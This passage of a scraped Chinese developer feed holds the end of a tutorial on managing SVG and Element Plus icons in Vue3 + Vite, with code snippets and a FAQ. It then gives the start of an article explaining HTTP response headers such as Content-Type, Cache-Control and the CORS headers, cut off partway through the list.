<p><strong>后台管理系统</strong>：</p>
<ul>
<li>权限管理的角色图标</li>
<li>部门管理的部门图标</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-21">八、最佳实践</h2>
<h3 data-id="heading-22">1. SVG 图标设计原则</h3>
<pre><code class="hljs language-svg" lang="svg"><span class="hljs-comment">&lt;!-- ✅ 推荐：单色 SVG，便于动态改色 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">viewBox</span>=<span class="hljs-string">"0 0 24 24"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">path</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M..."</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"currentColor"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>

<span class="hljs-comment">&lt;!-- ❌ 避免：多色 SVG，难以动态改色 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">viewBox</span>=<span class="hljs-string">"0 0 24 24"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">path</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M..."</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"#ff0000"</span>/&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">path</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M..."</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"#00ff00"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
</code></pre>
<h3 data-id="heading-23">2. 图标命名规范</h3>
<pre><code class="hljs language-scss" lang="scss">推荐的命名方式：
✅ chart<span class="hljs-selector-class">.svg</span>
✅ user-add<span class="hljs-selector-class">.svg</span>
✅ arrow-<span class="hljs-attribute">right</span><span class="hljs-selector-class">.svg</span>
✅ document-copy<span class="hljs-selector-class">.svg</span>

避免的命名方式：
❌ Chart<span class="hljs-selector-class">.svg</span> (大小写混合)
❌ user_add<span class="hljs-selector-class">.svg</span> (使用下划线)
❌ userAdd<span class="hljs-selector-class">.svg</span> (驼峰式)
❌ icon_user_add<span class="hljs-selector-class">.svg</span> (过长)
</code></pre>
<h3 data-id="heading-24">3. 性能优化建议</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ❌ 不推荐：在组件内频繁调用</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">setup</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> { svgIcons } = <span class="hljs-title function_">useSvgIcon</span>()
    svgIcons.<span class="hljs-property">value</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// 频繁操作</span>
    })
  }
}

<span class="hljs-comment">// ✅ 推荐：缓存图标列表，避免重复计算</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">setup</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> { svgIcons } = <span class="hljs-title function_">useSvgIcon</span>()
    <span class="hljs-keyword">const</span> cachedIcons = <span class="hljs-title function_">ref</span>([])
    
    <span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
      cachedIcons.<span class="hljs-property">value</span> = svgIcons.<span class="hljs-property">value</span>
    })
    
    <span class="hljs-keyword">return</span> { cachedIcons }
  }
}
</code></pre>
<h3 data-id="heading-25">4. 与 Element Plus 的兼容性</h3>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- ✅ 推荐：使用 el-icon 包装 --&gt;
&lt;template&gt;
  &lt;el-icon :size="20"&gt;
    &lt;base-icon icon-name="chart" /&gt;
  &lt;/el-icon&gt;
&lt;/template&gt;

&lt;!-- ✅ 推荐：在按钮中使用 --&gt;
&lt;template&gt;
  &lt;el-button&gt;
    &lt;template #icon&gt;
      &lt;base-icon icon-name="plus" /&gt;
    &lt;/template&gt;
    新增
  &lt;/el-button&gt;
&lt;/template&gt;
</code></pre>
<h3 data-id="heading-26">5. 色彩管理</h3>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- 定义 CSS 变量管理图标颜色 --&gt;
&lt;template&gt;
  &lt;div class="icon-wrapper"&gt;
    &lt;base-icon icon-name="chart" class="icon-primary" /&gt;
    &lt;base-icon icon-name="user-add" class="icon-success" /&gt;
    &lt;base-icon icon-name="delete" class="icon-danger" /&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;style scoped lang="scss"&gt;
.icon-wrapper {
  --icon-primary: #1890ff;
  --icon-success: #52c41a;
  --icon-danger: #f5222d;
}

.icon-primary {
  color: var(--icon-primary);
}

.icon-success {
  color: var(--icon-success);
}

.icon-danger {
  color: var(--icon-danger);
}
&lt;/style&gt;
</code></pre>
<h3 data-id="heading-27">6. TypeScript 类型安全</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 定义图标类型</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">IconType</span> = <span class="hljs-string">'svg'</span> | <span class="hljs-string">'element-plus'</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">SvgIconName</span> = <span class="hljs-string">'chart'</span> | <span class="hljs-string">'checkbox'</span> | <span class="hljs-string">'user-add'</span> <span class="hljs-comment">// 替换为实际图标名</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ElementPlusIconName</span> = <span class="hljs-string">'Plus'</span> | <span class="hljs-string">'Delete'</span> | <span class="hljs-string">'Edit'</span> <span class="hljs-comment">// 替换为实际图标名</span>

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">IconProps</span> {
  <span class="hljs-attr">iconName</span>: <span class="hljs-title class_">SvgIconName</span> | <span class="hljs-title class_">ElementPlusIconName</span>
  iconType?: <span class="hljs-title class_">IconType</span>
  color?: <span class="hljs-built_in">string</span>
  className?: <span class="hljs-built_in">string</span>
}

<span class="hljs-comment">// 使用</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">useIcon</span> = (<span class="hljs-params">props: IconProps</span>) =&gt; {
  <span class="hljs-comment">// 类型安全的图标使用</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-28">九、常见问题解决</h2>
<h3 data-id="heading-29">Q1: SVG 图标在构建后无法显示</h3>
<p><strong>原因</strong>：</p>
<ul>
<li>SVG 文件未正确放置在配置的目录中</li>
<li>虚拟模块未正确注册</li>
</ul>
<p><strong>解决方案</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. 检查 vite.config.ts 中的 iconDirs 配置</span>
<span class="hljs-keyword">const</span> iconDirs = [path.<span class="hljs-title function_">resolve</span>(process.<span class="hljs-title function_">cwd</span>(), <span class="hljs-string">'src/assets/icons/svg'</span>)]

<span class="hljs-comment">// 2. 确保在 main.ts 中导入了虚拟模块</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'virtual:svg-icons-register'</span>

<span class="hljs-comment">// 3. 清除构建缓存</span>
rm -rf dist node_modules/.<span class="hljs-property">vite</span>
npm run build
</code></pre>
<h3 data-id="heading-30">Q2: Element Plus 图标在某些情况下不显示</h3>
<p><strong>原因</strong>：</p>
<ul>
<li>图标名称转换错误</li>
<li>Element Plus 版本不匹配</li>
</ul>
<p><strong>解决方案</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 检查图标名称转换是否正确</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">testIconName</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) =&gt; {
  <span class="hljs-keyword">const</span> pascalName = name
    .<span class="hljs-title function_">split</span>(<span class="hljs-regexp">/[-_]/</span>)
    .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">word</span> =&gt;</span> word.<span class="hljs-title function_">charAt</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_">toUpperCase</span>() + word.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>))
    .<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>)
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${name}</span> =&gt; <span class="hljs-subst">${pascalName}</span>`</span>)
}

<span class="hljs-title function_">testIconName</span>(<span class="hljs-string">'user-add'</span>)  <span class="hljs-comment">// 输出: UserAdd</span>
<span class="hljs-title function_">testIconName</span>(<span class="hljs-string">'close'</span>)     <span class="hljs-comment">// 输出: Close</span>
</code></pre>
<h3 data-id="heading-31">Q3: 图标选择器中搜索不工作</h3>
<p><strong>原因</strong>：</p>
<ul>
<li>SVG 图标或 Element Plus 图标列表未正确加载</li>
<li>搜索关键词不匹配</li>
</ul>
<p><strong>解决方案</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 在 mounted 中明确调用初始化</span>
<span class="hljs-title function_">onMounted</span>(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">loadSvgIcons</span>()
  <span class="hljs-title function_">initElementPlusIcons</span>()
  
  <span class="hljs-comment">// 验证图标已加载</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'SVG Icons:'</span>, svgIcons.<span class="hljs-property">value</span>)
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Element Plus Icons:'</span>, elementPlusIcons.<span class="hljs-property">value</span>)
})
</code></pre>
<h3 data-id="heading-32">Q4: 如何动态加载更多 SVG 图标？</h3>
<p><strong>解决方案</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 在 vite.config.ts 中配置多个目录</span>
<span class="hljs-title function_">createSvgIcon</span>({
  <span class="hljs-attr">iconDirs</span>: [
    path.<span class="hljs-title function_">resolve</span>(process.<span class="hljs-title function_">cwd</span>(), <span class="hljs-string">'src/assets/icons/svg'</span>),
    path.<span class="hljs-title function_">resolve</span>(process.<span class="hljs-title function_">cwd</span>(), <span class="hljs-string">'src/assets/icons/business'</span>),  <span class="hljs-comment">// 业务图标</span>
    path.<span class="hljs-title function_">resolve</span>(process.<span class="hljs-title function_">cwd</span>(), <span class="hljs-string">'src/assets/icons/common'</span>),    <span class="hljs-comment">// 通用图标</span>
  ],
  <span class="hljs-attr">symbolId</span>: <span class="hljs-string">'icon-[dir]-[name]'</span>,
})
</code></pre>
<h3 data-id="heading-33">Q5: 如何在 TypeScript 中获得图标名称的自动补全？</h3>
<p><strong>解决方案</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 创建类型定义文件: src/types/icons.ts</span>
<span class="hljs-keyword">import</span> { useSvgIcon } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/compositions/useSvgIcon'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">SvgIconName</span> = <span class="hljs-string">'chart'</span> | <span class="hljs-string">'checkbox'</span> | <span class="hljs-string">'user-add'</span> <span class="hljs-comment">// 手动维护或通过脚本生成</span>

<span class="hljs-comment">// 创建辅助函数获得更好的类型支持</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useIcon</span> = (<span class="hljs-params">iconName: SvgIconName</span>) =&gt; {
  <span class="hljs-keyword">const</span> { isSvgIcon } = <span class="hljs-title function_">useSvgIcon</span>()
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">isSvgIcon</span>(iconName)
}
</code></pre>
<p><strong>或使用脚本自动生成</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// scripts/generate-icon-types.js</span>
<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>)
<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>)

<span class="hljs-keyword">const</span> svgDir = path.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'src/assets/icons/svg'</span>)
<span class="hljs-keyword">const</span> files = fs.<span class="hljs-title function_">readdirSync</span>(svgDir)
<span class="hljs-keyword">const</span> iconNames = files
  .<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">f</span> =&gt;</span> f.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.svg'</span>))
  .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">f</span> =&gt;</span> f.<span class="hljs-title function_">replace</span>(<span class="hljs-string">'.svg'</span>, <span class="hljs-string">''</span>))

<span class="hljs-keyword">const</span> content = <span class="hljs-string">`
export type SvgIconName = <span class="hljs-subst">${iconNames.map(n =&gt; <span class="hljs-string">`'<span class="hljs-subst">${n}</span>'`</span>).join(<span class="hljs-string">' | '</span>)}</span>
`</span>

fs.<span class="hljs-title function_">writeFileSync</span>(<span class="hljs-string">'src/types/icons.ts'</span>, content)
</code></pre>
<hr/>
<h2 data-id="heading-34">十、总结</h2>
<p>本文档详细介绍了在 Vue3 + Vite 项目中整合 SVG 图标和 Element Plus 图标的完整解决方案，包括：</p>
<ol>
<li>✅ <strong>构建层面</strong>：通过 vite-plugin-svg-icons 实现 SVG 自动化打包</li>
<li>✅ <strong>注册层面</strong>：在 main.ts 中统一注册两类图标</li>
<li>✅ <strong>组件层面</strong>：提供 SvgIcon、BaseIcon 等可复用组件</li>
<li>✅ <strong>工具层面</strong>：通过 useSvgIcon Composable 提供统一的图标管理 API</li>
<li>✅ <strong>应用层面</strong>：通过 IconSelect 实现动态图标选择功能</li>
</ol>
<p>这套方案具有以下优势：</p>
<ul>
<li>📦 <strong>开箱即用</strong>：最小化配置，快速集成</li>
<li>🎯 <strong>智能识别</strong>：自动区分 SVG 和 Element Plus 图标</li>
<li>🚀 <strong>性能优化</strong>：SVG 自动合并，减少 HTTP 请求</li>
<li>💪 <strong>类型安全</strong>：完整的 TypeScript 支持</li>
<li>🎨 <strong>灵活定制</strong>：支持颜色、大小等多种自定义</li>
<li>🔍 <strong>易于维护</strong>：集中管理，统一接口</li>
</ul>
<p>希望本文档能够帮助你快速实现一个高效的图标管理系统！</p>
<hr/>
<h2 data-id="heading-35">十一、参考资源</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fvitejs.dev%2F" target="_blank" title="https://vitejs.dev/" ref="nofollow noopener noreferrer">Vite 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fvuejs.org%2F" target="_blank" title="https://vuejs.org/" ref="nofollow noopener noreferrer">Vue 3 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Felement-plus.org%2F" target="_blank" title="https://element-plus.org/" ref="nofollow noopener noreferrer">Element Plus 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvbenjs%2Fvite-plugin-svg-icons" target="_blank" title="https://github.com/vbenjs/vite-plugin-svg-icons" ref="nofollow noopener noreferrer">vite-plugin-svg-icons GitHub</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端必读：HTTP 协议核心知识全景图（三）—— 响应头详解]]></title>    <link>https://juejin.cn/post/7575884229525602340</link>    <guid>https://juejin.cn/post/7575884229525602340</guid>    <pubDate>2025-11-24T06:53:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575884229525602340" data-draft-id="7575937594351386667" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端必读：HTTP 协议核心知识全景图（三）—— 响应头详解"/> <meta itemprop="keywords" content="前端,HTTP"/> <meta itemprop="datePublished" content="2025-11-24T06:53:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="西瓜树枝"/> <meta itemprop="url" content="https://juejin.cn/user/424827408622238"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端必读：HTTP 协议核心知识全景图（三）—— 响应头详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/424827408622238/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    西瓜树枝
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:53:21.000Z" title="Mon Nov 24 2025 06:53:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、引言：从 “请求” 到 “响应”</h2>
<p>上一篇解析了请求头作为客户端 “提问” 的载体，本文聚焦服务器 “回答” 的核心 —— 响应头。服务器通过响应头向客户端传递资源元信息、处理结果、行为指令（如缓存策略、安全限制等）。理解响应头是解析接口返回、调试错误、优化缓存、保障安全的关键（如跨域配置、Cookie 设置、文件下载等均依赖响应头）。</p>
<h2 data-id="heading-1">二、HTTP 响应头基础：定义与结构</h2>
<ol>
<li>什么是 HTTP 响应头？</li>
</ol>
<ul>
<li>
<ul>
<li>位于状态行之后、响应体之前的键值对集合</li>
<li>格式：<code>Header-Name: value</code>（与请求头一致，首字母大写为常规约定）</li>
</ul>
</li>
</ul>
<ol start="2">
<li>响应头的核心作用</li>
</ol>
<ul>
<li>
<ul>
<li>描述响应体的基本信息（如类型、长度、编码方式）</li>
<li>告知客户端如何处理响应（如缓存规则、重定向方向）</li>
<li>传递安全限制、身份验证结果等关键信息</li>
</ul>
</li>
</ul>
<ol start="3">
<li>与请求头的关联：二者是 “问答” 关系（如请求头<code>Accept</code>对应响应头<code>Content-Type</code>）</li>
</ol>
<h2 data-id="heading-2">三、核心响应头详解（按功能分类）</h2>
<h3 data-id="heading-3">（一）响应内容描述类：告诉客户端 “返回的是什么”</h3>
<ol>
<li><code>Content-Type</code></li>
</ol>
<ul>
<li>
<ul>
<li>作用：指定响应体的数据格式（MIME 类型）及字符编码</li>
<li>常见取值：</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>
<ul>
<li><code>text/html; charset=utf-8</code>（HTML 页面）</li>
<li><code>application/json; charset=utf-8</code>（JSON 数据，前端 AJAX 最常用）</li>
<li><code>image/jpeg</code>（JPEG 图片）、<code>video/mp4</code>（MP4 视频）</li>
</ul>
</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>前端关联：浏览器根据该头解析内容（如 JSON 自动转对象、图片直接渲染）</li>
</ul>
</li>
</ul>
<ol start="2">
<li><code>Content-Length</code></li>
</ol>
<ul>
<li>
<ul>
<li>作用：标识响应体的字节长度（帮助客户端判断数据是否完整接收）</li>
<li>示例：<code>Content-Length: 2048</code></li>
</ul>
</li>
</ul>
<ol start="3">
<li><code>Content-Encoding</code></li>
</ol>
<ul>
<li>
<ul>
<li>作用：告知客户端响应体使用的压缩算法（需与请求头<code>Accept-Encoding</code>对应）</li>
<li>常见取值：<code>gzip</code>、<code>deflate</code>、<code>br</code>（Brotli）</li>
<li>前端关联：浏览器自动解压，开发者无需手动处理，但需关注压缩率对性能的影响</li>
</ul>
</li>
</ul>
<ol start="4">
<li><code>Content-Disposition</code></li>
</ol>
<ul>
<li>
<ul>
<li>作用：指定响应内容的展示方式（inline 直接显示 /attachment 作为文件下载）</li>
<li>示例：</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>
<ul>
<li><code>Content-Disposition: inline</code>（默认，如图片、HTML 直接显示）</li>
<li><code>Content-Disposition: attachment; filename="report.pdf"</code>（触发文件下载，文件名为 report.pdf）</li>
</ul>
</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>前端关联：实现文件下载的核心响应头（配合<code>a</code>标签<code>download</code>属性使用）</li>
</ul>
</li>
</ul>
<h3 data-id="heading-4">（二）缓存控制类：指导客户端 “如何缓存资源”</h3>
<ol>
<li><code>Cache-Control</code>（响应端指令）</li>
</ol>
<ul>
<li>
<ul>
<li>作用：服务器指定资源的缓存策略（优先级最高，覆盖其他缓存头）</li>
<li>常用取值：</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>
<ul>
<li><code>public</code>：允许任何缓存（如 CDN、浏览器）存储该资源</li>
<li><code>private</code>：仅允许客户端浏览器缓存（不允许 CDN 等中间代理缓存）</li>
<li><code>max-age=3600</code>：资源有效期为 3600 秒（从响应生成时开始计算）</li>
<li><code>no-cache</code>：缓存前必须向服务器验证有效性（需配合 ETag/Last-Modified）</li>
<li><code>no-store</code>：禁止任何缓存（每次都需重新请求）</li>
</ul>
</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>示例：<code>Cache-Control: public, max-age=86400</code>（允许公开缓存，有效期 1 天）</li>
<li>前端关联：静态资源（如 JS、CSS、图片）优化的核心配置，直接影响页面加载速度</li>
</ul>
</li>
</ul>
<ol start="2">
<li><code>Expires</code></li>
</ol>
<ul>
<li>
<ul>
<li>作用：指定资源的过期时间（HTTP/1.0 遗留头，优先级低于<code>Cache-Control: max-age</code>）</li>
<li>示例：<code>Expires: Wed, 20 Jun 2024 12:00:00 GMT</code></li>
<li>注意：基于服务器时间，若客户端时间与服务器不一致可能导致缓存异常</li>
</ul>
</li>
</ul>
<ol start="3">
<li><code>Last-Modified</code></li>
</ol>
<ul>
<li>
<ul>
<li>作用：标识资源最后修改的时间（与请求头<code>If-Modified-Since</code>配合实现协商缓存）</li>
<li>示例：<code>Last-Modified: Tue, 15 Nov 2022 12:00:00 GMT</code></li>
</ul>
</li>
</ul>
<ol start="4">
<li><code>ETag</code></li>
</ol>
<ul>
<li>
<ul>
<li>作用：资源的唯一标识（通常是内容哈希，与请求头<code>If-None-Match</code>配合实现协商缓存）</li>
<li>示例：<code>ETag: "abc123"</code>（强验证器）或 <code>W/"abc123"</code>（弱验证器，忽略 minor 变化）</li>
<li>优势：相比<code>Last-Modified</code>，能识别内容未变但修改时间更新的场景（如文件重写）</li>
</ul>
</li>
</ul>
<h3 data-id="heading-5">（三）跨域资源共享（CORS）类：控制 “跨域请求的权限”</h3>
<ol>
<li><code>Access-Control-Allow-Origin</code></li>
</ol>
<ul>
<li>
<ul>
<li>作用：指定允许跨域请求的源站（与请求头<code>Origin</code>对应）</li>
<li>示例：</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>
<ul>
<li><code>Access-Control-Allow-Origin: https://www.example.com</code>（仅允许特定源）</li>
<li><code>Access-Control-Allow-Origin: *</code>（允许所有源，适合公开资源）</li>
</ul>
</li>
</ul>
</li>
</ul>

<ul>
<li>
<ul>
<li>前端关联：跨域请求成功的核心前提，若不匹配则触发 CORS 错误</li>
</ul>
</li>
</ul>
<ol start="2">
<li><code>Access-Control-Allow-Methods</code></li>
</ol>
<ul>
<li>
<ul>
<li>作用：告知客户端服务器允许的跨域请求方法（如 GET、POST、PUT 等）</li>
<li>示例：<code>Access-Control-Allow-Methods: GET, POST, OPTIONS</code></li>
<li>关联场景：非简单跨域请求（如 PUT、DELETE）的预检请求（OPTIONS）中返回</li>
</ul>
</li>
</ul>
<ol start="3">
<li><code>Access-Control-Allow-Headers</code></li>
</ol>
<ul>
<li>
<ul>
<li>作用：指定允许的跨域请求头（与客户端自定义请求头对应）</li>
<li>示例：<code>Access-Control-Allow-Headers: X-Custom-Header, Content-Type</code></li>
<li>前端关联：若请求包含自定义头，需服务器通过该头允许，否则预检失败</li>
</ul>
</li>
</ul>
<ol start="4">
<li><code>Access-Control-Allow-Credentials</code></li>
</ol>
<ul>
<li>
<ul>
<li>作用：标识是否允许跨域请求携带 Cookie 等凭据（需与客户端<code>withCredentials</code>配合）</li>
<li>示例：<code>Access-Control-Allow-Credentials: true</code></li>
